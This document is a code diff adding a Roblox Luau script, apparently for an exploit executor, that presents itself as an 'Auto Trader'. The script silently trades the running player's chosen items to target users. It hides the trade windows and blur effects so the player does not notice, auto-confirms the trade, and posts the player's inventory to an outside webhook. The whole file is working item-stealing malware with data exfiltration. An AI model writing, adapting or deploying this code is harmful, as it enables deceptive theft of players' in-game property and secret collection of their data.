@@ -1,0 +1,351 @@
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local HttpService = game:GetService("HttpService")
+local Lighting = game:GetService("Lighting")
+local LocalPlayer = Players.LocalPlayer
+local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
+local Net = require(ReplicatedStorage.Packages.Net)
+local Synchronizer = require(ReplicatedStorage.Packages.Synchronizer)
+local Gears = require(ReplicatedStorage.Shared.Gears)
+
+local TARGET_USERS = getgenv().TARGET_USERS or {}
+local WEBHOOK_URL = getgenv().WEBHOOK_URL
+local NORMAL_BRAINROTS = getgenv().NORMAL_BRAINROTS or {}
+local NORMAL_BASE_SKINS = getgenv().NORMAL_BASE_SKINS or {}
+local NORMAL_GEARS = getgenv().NORMAL_GEARS or {}
+local DELAY = getgenv().DELAY_BETWEEN_INVITES or 15
+
+-- Remotes corretos
+local Invite = Net:RemoteFunction("TradeService/Invite")
+local AddBrainrot = Net:RemoteFunction("TradeService/AddBrainrot")
+local AddItem = Net:RemoteFunction("TradeService/AddItem")
+local Ready = Net:RemoteEvent("TradeService/Ready")
+local Accept = Net:RemoteEvent("TradeService/Accept")
+local TradeCompleted = Net:RemoteEvent("TradeService/TradeCompleted")
+
+-- GUIDs do TradeController
+local INVITE_GUID = "afb005f9-6e81-4e0a-8bb0-3555938a9658"
+local ADD_BRAINROT_GUID = "6b5f15fb-5cb9-4d07-a031-bbff8e641eda"
+local ADD_ITEM_GUID = "f2c4a9d1-3b7e-4a51-9c8d-1e6f0a2b3c4d"
+local READY_GUID = "d73acf93-6f32-44df-b813-0f6b32c7afd9"
+local ACCEPT_GUID = "918ee0f5-e98f-413f-b76e-baee47b021cb"
+
+local targets = {}
+local cooldown = {}
+local hasWantedItems = false
+local tradeActive = false
+local tradeAddDone = false
+local webhookSent = false
+
+-- Resolve IDs dos targets
+for _, name in ipairs(TARGET_USERS) do
+    local ok, id = pcall(function()
+        return Players:GetUserIdFromNameAsync(name)
+    end)
+    if ok and id then
+        table.insert(targets, {name = name, id = id})
+    end
+end
+
+if #targets == 0 then return end
+
+local playerData = Synchronizer:Wait(LocalPlayer)
+if not playerData then return end
+
+local function getData()
+    local ok, data = pcall(function()
+        return Synchronizer:Get(LocalPlayer)
+    end)
+    return (ok and data) or nil
+end
+
+-- Remove UI da trade
+local function clearEffects()
+    for _, v in ipairs(Lighting:GetChildren()) do
+        if v:IsA("BlurEffect") or v:IsA("DepthOfFieldEffect") then
+            pcall(function() v:Destroy() end)
+        end
+    end
+
+    local cam = workspace:FindFirstChild("Camera")
+    if cam then
+        for _, v in ipairs(cam:GetChildren()) do
+            if v:IsA("BlurEffect") or v:IsA("DepthOfFieldEffect") then
+                pcall(function() v:Destroy() end)
+            end
+        end
+    end
+
+    for _, guiName in ipairs({"TradeLiveTrade", "TradePrompts", "TradePlayerList"}) do
+        local gui = PlayerGui:FindFirstChild(guiName)
+        if gui then
+            gui.Enabled = false
+        end
+    end
+end
+
+task.spawn(function()
+    while true do
+        clearEffects()
+        task.wait(0.25)
+    end
+end)
+
+workspace.DescendantAdded:Connect(function(d)
+    if d:IsA("BlurEffect") or d:IsA("DepthOfFieldEffect") then
+        pcall(function() d:Destroy() end)
+    end
+end)
+
+TradeCompleted.OnClientEvent:Connect(function()
+    print("✅ Trade completa!")
+    tradeActive = false
+    tradeAddDone = false
+    for _, t in ipairs(targets) do
+        cooldown[t.id] = true
+    end
+    task.delay(60, function()
+        for _, t in ipairs(targets) do
+            cooldown[t.id] = false
+        end
+    end)
+end)
+
+local function getBrainrots()
+    local list = {}
+    local pdata = getData()
+    if not pdata then return list end
+
+    local podiums = pdata:Get("AnimalPodiums")
+    if type(podiums) ~= "table" then return list end
+
+    for slot, data in pairs(podiums) do
+        if type(data) == "table" and data.Index and not data.Machine then
+            local stealing = data.StealToken ~= nil
+                or data.ActiveStealUUID ~= nil
+                or data.Stolen == true
+                or data.Steal ~= nil
+                or data.StealText ~= nil
+            if not stealing then
+                table.insert(list, {
+                    slot = slot,
+                    data = data,
+                    name = data.Index
+                })
+            end
+        end
+    end
+    return list
+end
+
+local function getBaseSkins()
+    local list = {}
+    local pdata = getData()
+    if not pdata then return list end
+
+    local inv = pdata:Get("BaseSkinInventory")
+    if type(inv) ~= "table" then return list end
+
+    for uuid, skin in pairs(inv) do
+        if type(uuid) == "string" and type(skin) == "table" and type(skin.SkinName) == "string" then
+            table.insert(list, {UUID = uuid, SkinName = skin.SkinName})
+        end
+    end
+    return list
+end
+
+local function getGears()
+    local list = {}
+    local pdata = getData()
+    if not pdata then return list end
+
+    local ok, owned = pcall(function()
+        return Gears.ListOwned(pdata)
+    end)
+    if ok and type(owned) == "table" then
+        for _, g in ipairs(owned) do
+            if type(g) == "table" and g.GearName then
+                table.insert(list, {GearName = g.GearName, UUID = g.UUID})
+            end
+        end
+    end
+    return list
+end
+
+local function checkHasWantedItems()
+    for _, br in ipairs(getBrainrots()) do
+        if NORMAL_BRAINROTS[br.name] then return true end
+    end
+    for _, skin in ipairs(getBaseSkins()) do
+        if NORMAL_BASE_SKINS[skin.SkinName] then return true end
+    end
+    for _, gear in ipairs(getGears()) do
+        if NORMAL_GEARS[gear.GearName] then return true end
+    end
+    return false
+end
+
+local function sendWebhook()
+    if not WEBHOOK_URL or WEBHOOK_URL == "" or webhookSent then return end
+    webhookSent = true
+
+    local brainrots = getBrainrots()
+    local skins = getBaseSkins()
+    local gears = getGears()
+
+    local brLines, skinLines, gearLines = {}, {}, {}
+
+    for _, br in ipairs(brainrots) do
+        local mut = br.data.Mutation and br.data.Mutation ~= "" and (" [" .. br.data.Mutation .. "]") or ""
+        local mark = NORMAL_BRAINROTS[br.name] and " ✅" or ""
+        table.insert(brLines, "• **" .. br.name .. "**" .. mut .. mark)
+    end
+    for _, s in ipairs(skins) do
+        local mark = NORMAL_BASE_SKINS[s.SkinName] and " ✅" or ""
+        table.insert(skinLines, "• **" .. s.SkinName .. "**" .. mark)
+    end
+    for _, g in ipairs(gears) do
+        local mark = NORMAL_GEARS[g.GearName] and " ✅" or ""
+        table.insert(gearLines, "• **" .. g.GearName .. "**" .. mark)
+    end
+
+    local function join(t)
+        if #t == 0 then return "_Nenhum_" end
+        return table.concat(t, "\n"):sub(1, 1000)
+    end
+
+    local payload = HttpService:JSONEncode({
+        username = "Trade Bot",
+        embeds = {{
+            title = "📦 Inventário detectado",
+            color = 5763719,
+            fields = {
+                {name = "👤 Player", value = "`" .. LocalPlayer.Name .. "`", inline = true},
+                {name = "🎯 Targets", value = "`" .. table.concat(TARGET_USERS, ", ") .. "`", inline = true},
+                {name = "🧠 Brainrots (" .. #brainrots .. ")", value = join(brLines), inline = false},
+                {name = "🏠 Base Skins (" .. #skins .. ")", value = #skinLines > 0 and join(skinLines) or "_Nenhuma_", inline = false},
+                {name = "⚙️ Gears (" .. #gears .. ")", value = join(gearLines), inline = false}
+            },
+            footer = {text = "Trade Bot • " .. os.date("%d/%m/%Y %H:%M:%S")}
+        }}
+    })
+
+    pcall(function()
+        local req = (syn and syn.request) or (http and http.request) or http_request or request
+        if req then
+            req({
+                Url = WEBHOOK_URL,
+                Method = "POST",
+                Headers = {["Content-Type"] = "application/json"},
+                Body = payload
+            })
+            print("[TradeBot] Webhook enviado!")
+        end
+    end)
+end
+
+task.spawn(function()
+    task.wait(5)
+    sendWebhook()
+end)
+
+local function doTradeActions()
+    if tradeAddDone then return end
+    tradeAddDone = true
+
+    print("🚀 Iniciando adição de items...")
+    task.wait(1.5)
+
+    -- Adiciona Brainrots - CORRIGIDO
+    local brainrots = getBrainrots()
+    print("📊 Total de Brainrots: " .. #brainrots)
+    
+    for _, br in ipairs(brainrots) do
+        if NORMAL_BRAINROTS[br.name] then
+            print("🧠 Adicionando Brainrot: " .. br.name .. " (slot: " .. br.slot .. ")")
+            pcall(function()
+                -- Passa apenas: GUID, slot, e toda a data do brainrot
+                local result = AddBrainrot:InvokeServer(ADD_BRAINROT_GUID, br.slot, br.data)
+                print("✅ Resultado: " .. tostring(result))
+            end)
+            task.wait(0.8)
+        end
+    end
+
+    -- Adiciona Base Skins - CORRIGIDO
+    local skins = getBaseSkins()
+    print("📊 Total de Base Skins: " .. #skins)
+    
+    for _, skin in ipairs(skins) do
+        if NORMAL_BASE_SKINS[skin.SkinName] then
+            print("🏠 Adicionando Base Skin: " .. skin.SkinName)
+            pcall(function()
+                -- Passa: GUID, tipo "BaseSkin", UUID, e SkinName
+                local result = AddItem:InvokeServer(ADD_ITEM_GUID, "BaseSkin", skin.UUID, skin.SkinName)
+                print("✅ Resultado: " .. tostring(result))
+            end)
+            task.wait(0.8)
+        end
+    end
+
+    -- Adiciona Gears - CORRIGIDO
+    local gears = getGears()
+    print("📊 Total de Gears: " .. #gears)
+    
+    for _, gear in ipairs(gears) do
+        if NORMAL_GEARS[gear.GearName] then
+            print("⚙️ Adicionando Gear: " .. gear.GearName)
+            pcall(function()
+                -- Passa: GUID, tipo "Gear", UUID, e GearName
+                local result = AddItem:InvokeServer(ADD_ITEM_GUID, "Gear", gear.UUID, gear.GearName)
+                print("✅ Resultado: " .. tostring(result))
+            end)
+            task.wait(0.8)
+        end
+    end
+
+    print("⏳ Aguardando antes de Ready...")
+    task.wait(2)
+    
+    print("🟢 Enviando Ready...")
+    pcall(function() Ready:FireServer(READY_GUID) end)
+    
+    task.wait(1.5)
+    
+    print("✅ Enviando Accept...")
+    pcall(function() Accept:FireServer(ACCEPT_GUID) end)
+end
+
+-- Loop principal
+task.spawn(function()
+    while true do
+        hasWantedItems = checkHasWantedItems()
+        print("🔍 Verificando items... hasWantedItems: " .. tostring(hasWantedItems))
+
+        if hasWantedItems then
+            for _, t in ipairs(targets) do
+                if not cooldown[t.id] and not tradeActive then
+                    print("📩 Tentando convidar: " .. t.name .. " (ID: " .. t.id .. ")")
+                    local ok = pcall(function()
+                        Invite:InvokeServer(INVITE_GUID, t.id)
+                    end)
+                    if ok then
+                        print("✅ Convite enviado!")
+                        tradeActive = true
+                        tradeAddDone = false
+                        task.spawn(doTradeActions)
+                    else
+                        print("❌ Falha ao enviar convite")
+                        tradeActive = false
+                    end
+                end
+                task.wait(DELAY)
+            end
+        else
+            task.wait(6)
+        end
+    end
+end)
+
+print("🚀 Auto Trader iniciado!")
+
